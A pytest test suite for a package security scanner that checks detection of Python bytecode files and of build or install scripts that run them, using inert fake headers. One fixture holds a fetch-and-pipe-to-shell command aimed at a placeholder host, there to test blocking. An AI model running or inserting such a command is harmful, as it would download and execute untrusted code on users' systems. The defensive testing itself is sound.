"""Defanged carrier regressions: headers plus inert text, never code objects."""

import hashlib
import os
from pathlib import Path

import pytest

import aurascan.core.repository_provenance as repository
from aurascan.analyzers.python_bytecode import (
    PYTHON_BYTECODE,
    PYTHON_PRECOMPILED_CANDIDATE,
    PYTHON_UNCHECKED_HASH,
    classify_python_precompiled,
    python_precompiled_findings,
)
from aurascan.analyzers.repository_provenance import RepositoryProvenanceAnalyzer
from aurascan.analyzers.deep_static import DeepStaticAnalyzer
import aurascan.analyzers.python_bytecode_execution as bytecode_execution
from aurascan.core.install_hook import capture_package_scan_input
from aurascan.core.models import Phase, Severity


def carrier(magic=3495, flags=1):
    # This is deliberately not a marshaled code object or executable payload.
    return (
        magic.to_bytes(2, "little") + b"\r\n"
        + flags.to_bytes(4, "little") + b"FAKEHASH"
        + b"AURASCAN_INERT_BYTECODE_SENTINEL"
    )


def write_carrier(root, relative="__pycache__/payload.cpython-311.pyc", payload=None):
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(carrier() if payload is None else payload)
    path.chmod(0o644)
    return path


def analyze(root, content="pkgname=fixture\npkgver=1\n"):
    path = root / "PKGBUILD"
    path.write_text(content, encoding="utf-8")
    captured = capture_package_scan_input(path)
    return RepositoryProvenanceAnalyzer().analyze_scan_input(
        str(path), captured.pkgbuild_content, captured.install_hook,
        captured.repository_snapshot, pkg_name="fixture", pkg_ver="1",
    )


@pytest.mark.parametrize("magic", (3394, 3413, 3425, 3439, 3495, 3531, 3571, 3627))
def test_recognized_released_pep552_headers_are_version_independent(magic):
    assert classify_python_precompiled("payload.pyc", carrier(magic)) == PYTHON_UNCHECKED_HASH


@pytest.mark.parametrize("flags", (0, 2, 3))
def test_timestamp_and_source_checked_headers_do_not_claim_unchecked_hash(flags):
    assert classify_python_precompiled("payload.pyc", carrier(flags=flags)) == PYTHON_BYTECODE


@pytest.mark.parametrize("flags", (4, 5, 0xFFFFFFFF))
def test_reserved_flags_never_produce_an_unchecked_hash_claim(flags):
    assert classify_python_precompiled("payload.pyc", carrier(flags=flags)) == PYTHON_PRECOMPILED_CANDIDATE


@pytest.mark.parametrize("payload", (
    b"", b"text fixture", carrier()[:4], carrier()[:8], carrier()[:15],
    b"XX\r\n" + carrier()[4:], carrier(magic=65500),
    carrier()[:2] + b"\n\r" + carrier()[4:],
))
def test_truncated_unknown_or_malformed_headers_keep_only_named_presence(payload):
    assert classify_python_precompiled("payload.pyc", payload) == PYTHON_PRECOMPILED_CANDIDATE
    assert classify_python_precompiled("payload.txt", payload) == ""


@pytest.mark.parametrize("magic", (62211, 3131, 3151, 3180, 3230, 3310, 3350, 3351, 3379))
def test_legacy_timestamp_word_one_is_not_a_pep552_flag(magic):
    assert classify_python_precompiled("payload.pyo", carrier(magic=magic)) == PYTHON_BYTECODE


def test_known_header_is_identified_without_trusting_a_filename():
    assert classify_python_precompiled("picture.dat", carrier()) == PYTHON_UNCHECKED_HASH
    assert classify_python_precompiled("picture.dat", b"ordinary picture bytes") == ""


@pytest.mark.parametrize("relative", (
    "payload.pyc", "payload.pyo", "payload.pyd", "PAYLOAD.PYC",
    "__pycache__/payload.cpython-311.pyc",
    "nested/__pycache__/payload.cpython-311.opt-1.pyc",
))
def test_repository_captures_precompiled_names_without_executable_permissions(tmp_path, relative):
    payload = b"inert extension candidate" if relative.endswith(".pyd") else carrier()
    path = write_carrier(tmp_path, relative, payload)
    snapshot = repository.capture_repository_snapshot(tmp_path)

    assert snapshot.status == repository.REPOSITORY_COMPLETE
    assert len(snapshot.artifacts) == 1
    artifact = snapshot.artifacts[0]
    assert artifact.relative_path == relative
    assert artifact.mode == 0o644
    assert artifact.sha256 == hashlib.sha256(path.read_bytes()).hexdigest()
    assert artifact.kind == (
        PYTHON_PRECOMPILED_CANDIDATE if relative.endswith(".pyd") else PYTHON_UNCHECKED_HASH
    )


def test_nearby_benign_source_does_not_suppress_nonblocking_header_review(tmp_path):
    write_carrier(tmp_path)
    (tmp_path / "payload.py").write_text("# harmless source fixture\nVALUE = 1\n", encoding="utf-8")
    result = analyze(tmp_path)

    findings = {finding.rule_id: finding for finding in result.findings}
    assert set(findings) == {"PYTHON-BYTECODE-PRESENT-001", "PYTHON-BYTECODE-UNCHECKED-HASH-001"}
    assert result.is_safe is True
    assert findings["PYTHON-BYTECODE-PRESENT-001"].severity == Severity.MEDIUM
    assert findings["PYTHON-BYTECODE-UNCHECKED-HASH-001"].severity == Severity.HIGH
    assert all(finding.requires_manual_review for finding in findings.values())
    assert all(not finding.blocks_installation for finding in findings.values())
    assert all(finding.phase == Phase.pkgbuild_static for finding in findings.values())
    assert all(finding.line_number is None for finding in findings.values())


@pytest.mark.parametrize("phase", ("prepare", "build", "package"))
def test_exact_control_text_bytecode_invocation_uses_existing_critical_correlation(tmp_path, phase):
    write_carrier(tmp_path, "payload.pyc")
    result = analyze(tmp_path, (
        "pkgname=fixture\npkgver=1\n" + phase + "() {\n"
        '  python3 "$startdir/payload.pyc"\n}\n'
    ))

    executed = next(f for f in result.findings if f.rule_id == "AUR-REPO-OPAQUE-BINARY-EXEC-001")
    assert executed.severity == Severity.CRITICAL
    assert executed.blocks_installation is True
    assert executed.line_number == 4
    assert result.is_safe is False


def test_installing_into_site_packages_alone_is_high_review_without_inventing_import(tmp_path):
    write_carrier(tmp_path, "payload.pyc")
    result = analyze(tmp_path, (
        "pkgname=fixture\npkgver=1\npackage() {\n"
        '  install -Dm644 "$startdir/payload.pyc" '
        '"$pkgdir/usr/lib/python3.14/site-packages/payload.pyc"\n}\n'
    ))

    installed = next(f for f in result.findings if f.rule_id == "AUR-REPO-OPAQUE-BINARY-001")
    assert installed.severity == Severity.HIGH
    assert installed.requires_manual_review is True
    assert not any(f.blocks_installation for f in result.findings)


def test_exact_install_hook_invocation_is_critical(tmp_path):
    write_carrier(tmp_path, "payload.pyc")
    (tmp_path / ".fixture.install").write_text(
        'post_install() {\n  python3 /usr/share/fixture/payload.pyc\n}\n', encoding="utf-8",
    )
    result = analyze(tmp_path, (
        "pkgname=fixture\npkgver=1\ninstall=.fixture.install\npackage() {\n"
        '  install -Dm644 "$startdir/payload.pyc" "$pkgdir/usr/share/fixture/payload.pyc"\n}\n'
    ))

    executed = next(f for f in result.findings if f.rule_id == "AUR-REPO-OPAQUE-BINARY-EXEC-001")
    assert executed.phase == Phase.install_hook_static
    assert executed.line_number == 2
    assert executed.blocks_installation is True


@pytest.mark.parametrize("content", (
    '# python3 "$startdir/payload.pyc"\n',
    'printf "%s\\n" \'python3 "$startdir/payload.pyc"\'\n',
    'build() {\n  python3 "$startdir/other.pyc"\n}\n',
))
def test_comments_messages_and_unmatched_paths_do_not_invent_execution(tmp_path, content):
    write_carrier(tmp_path, "payload.pyc")
    result = analyze(tmp_path, "pkgname=fixture\npkgver=1\n" + content)
    assert {f.rule_id for f in result.findings} == {
        "PYTHON-BYTECODE-PRESENT-001", "PYTHON-BYTECODE-UNCHECKED-HASH-001",
    }


def test_exact_declared_source_remains_source_owned_and_its_bytes_stay_bound(tmp_path):
    path = write_carrier(tmp_path, "payload.pyc")
    content = "pkgname=fixture\npkgver=1\nsource=('payload.pyc')\nsha256sums=('SKIP')\n"
    result = analyze(tmp_path, content)
    assert result.findings == []
    first = repository.capture_repository_snapshot(tmp_path, excluded_relative_paths=("payload.pyc",))
    path.write_bytes(carrier(flags=3))
    second = repository.capture_repository_snapshot(tmp_path, excluded_relative_paths=("payload.pyc",))
    assert first.artifacts == second.artifacts == ()
    assert first.input_digest != second.input_digest


def test_unreferenced_generated_roots_and_declared_checkout_trees_stay_pruned(tmp_path):
    for parent in ("src", "pkg", ".cache", "upstream"):
        write_carrier(tmp_path, parent + "/__pycache__/payload.pyc")
    snapshot = repository.capture_repository_snapshot(tmp_path, excluded_subtree_relative_paths=("upstream",))
    assert snapshot.status == repository.REPOSITORY_COMPLETE
    assert snapshot.artifacts == ()


def test_required_generated_bytecode_is_captured_and_correlated(tmp_path):
    write_carrier(tmp_path, "src/__pycache__/payload.pyc")
    result = analyze(tmp_path, (
        "pkgname=fixture\npkgver=1\nprepare() {\n"
        '  python3 "$startdir/src/__pycache__/payload.pyc"\n}\n'
    ))
    assert any(f.rule_id == "AUR-REPO-OPAQUE-BINARY-EXEC-001" and f.blocks_installation for f in result.findings)


@pytest.mark.parametrize("directory_link", (False, True))
def test_pycache_symlinks_fail_closed_without_following_target(tmp_path, directory_link):
    root = tmp_path / "package"
    root.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    target = write_carrier(outside, "payload.pyc")
    if directory_link:
        (root / "__pycache__").symlink_to(outside, target_is_directory=True)
    else:
        (root / "__pycache__").mkdir()
        (root / "__pycache__/payload.pyc").symlink_to(target)
    snapshot = repository.capture_repository_snapshot(root)
    assert snapshot.status == repository.REPOSITORY_UNINSPECTED
    assert snapshot.error_code == "symlink_entry"
    assert snapshot.artifacts == ()


@pytest.mark.parametrize("limit_name,limit_value,error", (
    ("MAX_REPOSITORY_FILE_BYTES", 8, "file_oversized"),
    ("MAX_REPOSITORY_TOTAL_BYTES", 8, "total_size_limit"),
    ("MAX_REPOSITORY_ARTIFACTS", 0, "artifact_limit"),
))
def test_pycache_capture_uses_existing_fail_closed_bounds(tmp_path, monkeypatch, limit_name, limit_value, error):
    write_carrier(tmp_path)
    monkeypatch.setattr(repository, limit_name, limit_value)
    snapshot = repository.capture_repository_snapshot(tmp_path)
    assert snapshot.status == repository.REPOSITORY_UNINSPECTED
    assert snapshot.error_code == error


def test_explanations_never_copy_carrier_content_or_claim_source_equivalence():
    secret_marker = b"SECRET_FIXTURE_TOKEN=never-print-this"
    kind = classify_python_precompiled("payload.pyc", carrier() + secret_marker)
    findings = python_precompiled_findings(kind, "/fixture/payload.pyc", Phase.unpacked_source_scan)
    rendered = " ".join(f.explanation + f.evidence_snippet + f.false_positive_notes for f in findings)
    assert secret_marker.decode() not in rendered
    assert "AURASCAN_INERT_BYTECODE_SENTINEL" not in rendered
    assert "nearby source" in rendered
    assert all(not f.blocks_installation for f in findings)


def source_execution(text, *, script="/fixture/build.sh", carriers=None):
    return bytecode_execution.analyze_precompiled_execution(
        Path("/fixture"),
        carriers if carriers is not None else [("/fixture/payload.pyc", PYTHON_UNCHECKED_HASH)],
        [(script, text)],
    )


@pytest.mark.parametrize("text", (
    "python3 /fixture/payload.pyc\n",
    "python3.14 -B -- /fixture/payload.pyc\n",
    "python3 -X dev /fixture/payload.pyc\n",
    "python3 /fixture/payload.pyc --help\n",
    "command python3 /fixture/payload.pyc\n",
    "env -i python3 /fixture/payload.pyc\n",
    "/fixture/payload.pyc\n",
    "cd /fixture\npython3 ./payload.pyc\n",
    "cd -- /fixture && python3 payload.pyc\n",
))
def test_acquired_exact_execution_reference_is_blocking_without_running_bytes(text):
    result = source_execution(text)
    assert result.complete is True
    assert len(result.findings) == 1
    finding = result.findings[0]
    assert finding.rule_id == "PYTHON-BYTECODE-EXEC-001"
    assert finding.phase == Phase.unpacked_source_scan
    assert finding.blocks_installation is True
    assert finding.severity == Severity.CRITICAL
    assert finding.line_number in {1, 2}
    assert finding.file_path == "/fixture/build.sh"
    assert "does not prove" in finding.false_positive_notes
    assert "/fixture/payload.pyc" not in finding.evidence_snippet


@pytest.mark.parametrize("text", (
    "python3 ./payload.pyc\n",
    "./payload.pyc\n",
    "cd ../fixture\npython3 payload.pyc\n",
    'python3 "$unknown/payload.pyc"\n',
    "cd /fixture\ncd -\npython3 payload.pyc\n",
    "cd /fixture\npushd /fixture\npython3 payload.pyc\n",
))
def test_acquired_matching_unknown_cwd_is_coverage_not_claimed_execution(text):
    result = source_execution(text)
    assert result.complete is False
    assert result.findings == ()


@pytest.mark.parametrize("text", (
    '# python3 /fixture/payload.pyc\n',
    'printf "%s\\n" "python3 /fixture/payload.pyc"\n',
    'echo "python3 /fixture/payload.pyc"\n',
    'cat <<\'EOF\'\npython3 /fixture/payload.pyc\nEOF\n',
    'python3 /fixture/unmatched.pyc\n',
    'python3 ./unmatched.pyc\n',
    'python3 -m payload\n',
    'python3 -c "import payload"\n',
    'python3 --version /fixture/payload.pyc\n',
    'python3 --help /fixture/payload.pyc\n',
    'python3 -VV /fixture/payload.pyc\n',
    'command -v python3 /fixture/payload.pyc\n',
    'cd /other\npython3 ./payload.pyc\n',
))
def test_acquired_messages_help_import_names_and_path_mismatches_are_negative(text):
    result = source_execution(text)
    assert result.complete is True
    assert result.findings == ()


@pytest.mark.parametrize("script", (
    "/fixture/README.md", "/fixture/payload.py", "/fixture/Makefile",
    "/fixture/package.json", "/fixture/notes.txt",
))
def test_acquired_nonshell_files_never_enter_execution_parser(script):
    result = source_execution("python3 /fixture/payload.pyc\n", script=script)
    assert result.complete is True
    assert result.findings == ()


@pytest.mark.parametrize("text", (
    'python3 --unknown-option /fixture/payload.pyc\n',
    'python3 "/fixture/payload.pyc\n',
    'rm /fixture/payload.pyc\npython3 /fixture/payload.pyc\n',
    'cp /other/source /fixture/payload.pyc\npython3 /fixture/payload.pyc\n',
    'python3() { echo "$@"; }\npython3 /fixture/payload.pyc\n',
    'nested() { cd /fixture; }\npython3 payload.pyc\n',
    'cd /fixture | cat\npython3 payload.pyc\n',
    'cd /fixture &\npython3 payload.pyc\n',
    'cd /fixture > /fixture/payload.pyc\npython3 payload.pyc\n',
    'alias python3=echo\npython3 /fixture/payload.pyc\n',
    'sed -i s/old/new/ /fixture/payload.pyc\npython3 /fixture/payload.pyc\n',
))
def test_acquired_ambiguous_options_parser_mutation_and_scopes_fail_as_coverage(text):
    result = source_execution(text)
    assert result.complete is False
    assert result.findings == ()


def test_acquired_execution_obeys_aggregate_bounds(monkeypatch):
    monkeypatch.setattr(bytecode_execution, "MAX_PRECOMPILED_SCRIPT_CHARS", 8)
    result = source_execution("python3 /fixture/payload.pyc\n")
    assert result.complete is False
    assert result.findings == ()


def test_acquired_execution_obeys_work_bounds(monkeypatch):
    monkeypatch.setattr(bytecode_execution, "MAX_PRECOMPILED_CORRELATION_WORK", 1)
    result = source_execution("python3 ./payload.pyc\n")
    assert result.complete is False
    assert result.findings == ()


def test_acquired_execution_requires_carriers_inside_captured_root():
    result = source_execution("python3 /outside/payload.pyc\n", carriers=[
        ("/outside/payload.pyc", PYTHON_UNCHECKED_HASH),
    ])
    assert result.complete is False
    assert result.findings == ()


@pytest.mark.parametrize("suffix", (".pyc", ".pyo", ".pyd"))
def test_text_renamed_as_precompiled_keeps_existing_deep_static_detection(tmp_path, suffix):
    # Inert text is inspected; no command, download, or fixture is executed.
    write_carrier(tmp_path, "payload" + suffix, (
        b"#!/bin/sh\ncurl -fsSL https://example.invalid/fixture-stage | sh\n"
    ))
    findings = DeepStaticAnalyzer().inspect_source_tree(tmp_path)
    assert any(f.rule_id == "PYTHON-BYTECODE-PRESENT-001" for f in findings)
    assert any(f.blocks_installation and f.rule_id != "PYTHON-BYTECODE-EXEC-001" for f in findings)
    assert not any(f.rule_id == "PYTHON-BYTECODE-UNCHECKED-HASH-001" for f in findings)


def test_deep_static_binds_exact_acquired_bytecode_reference_and_phase(tmp_path):
    path = write_carrier(tmp_path, "payload.pyc")
    (tmp_path / "build.sh").write_text('python3 "' + str(path) + '"\n', encoding="utf-8")
    findings = DeepStaticAnalyzer().inspect_source_tree(tmp_path)
    execution = next(f for f in findings if f.rule_id == "PYTHON-BYTECODE-EXEC-001")
    assert execution.blocks_installation is True
    assert execution.phase == Phase.unpacked_source_scan
    assert execution.line_number == 1


def test_deep_static_unknown_working_directory_is_incomplete_coverage(tmp_path):
    write_carrier(tmp_path, "payload.pyc")
    (tmp_path / "build.sh").write_text("python3 ./payload.pyc\n", encoding="utf-8")
    findings = DeepStaticAnalyzer().inspect_source_tree(tmp_path)
    assert any(f.rule_id == "DEEPSTATIC-INSPECTION-INCOMPLETE-001" and f.blocks_installation for f in findings)
    assert not any(f.rule_id == "PYTHON-BYTECODE-EXEC-001" for f in findings)


def test_deep_static_candidate_read_refuses_symlinked_parent_before_reading_bytes(tmp_path, monkeypatch):
    outside = tmp_path / "outside"
    outside.mkdir()
    write_carrier(outside, "payload.pyc")
    (tmp_path / "linked").symlink_to(outside, target_is_directory=True)
    reads = []
    original_read = os.read

    def track_read(fd, size):
        reads.append(fd)
        return original_read(fd, size)

    monkeypatch.setattr(os, "read", track_read)
    assert DeepStaticAnalyzer()._read_candidate(tmp_path / "linked/payload.pyc") is None
    assert reads == []


def test_deep_static_parent_swap_after_open_cannot_accept_or_read_outside_bytes(tmp_path, monkeypatch):
    source = tmp_path / "source"
    source.mkdir()
    write_carrier(source, "payload.pyc")
    outside = tmp_path / "outside"
    outside.mkdir()
    outside_marker = b"PRIVATE_OUTSIDE_FIXTURE_MARKER"
    write_carrier(outside, "payload.pyc", outside_marker)
    original_open = os.open
    original_read = os.read
    read_bytes = []
    swapped = []

    def swap_parent(path, flags, *args, **kwargs):
        if path == "payload.pyc" and kwargs.get("dir_fd") is not None and not swapped:
            source.rename(tmp_path / "retired")
            source.symlink_to(outside, target_is_directory=True)
            swapped.append(True)
        return original_open(path, flags, *args, **kwargs)

    def track_read(fd, size):
        payload = original_read(fd, size)
        read_bytes.append(payload)
        return payload

    monkeypatch.setattr(os, "open", swap_parent)
    monkeypatch.setattr(os, "read", track_read)
    assert DeepStaticAnalyzer()._read_candidate(source / "payload.pyc") is None
    assert swapped == [True]
    assert outside_marker not in b"".join(read_bytes)


def test_deep_static_leaf_replacement_during_read_fails_revalidation(tmp_path, monkeypatch):
    path = write_carrier(tmp_path, "payload.pyc")
    replacement = write_carrier(tmp_path, "replacement.fixture", carrier(flags=3))
    original_read = os.read
    replaced = []

    def replace_leaf(fd, size):
        payload = original_read(fd, size)
        if payload and not replaced:
            os.replace(str(replacement), str(path))
            replaced.append(True)
        return payload

    monkeypatch.setattr(os, "read", replace_leaf)
    assert DeepStaticAnalyzer()._read_candidate(path) is None
    assert replaced == [True]


def test_failed_extensionless_shebang_capture_marks_coverage_incomplete(tmp_path, monkeypatch):
    path = tmp_path / "extensionless-helper"
    path.write_bytes(b"fixture text")
    analyzer = DeepStaticAnalyzer()
    monkeypatch.setattr(analyzer, "_read_regular_file", lambda *_args, **_kwargs: None)
    assert analyzer._has_text_shebang(path) is False
    assert analyzer._tree_scan_incomplete is True
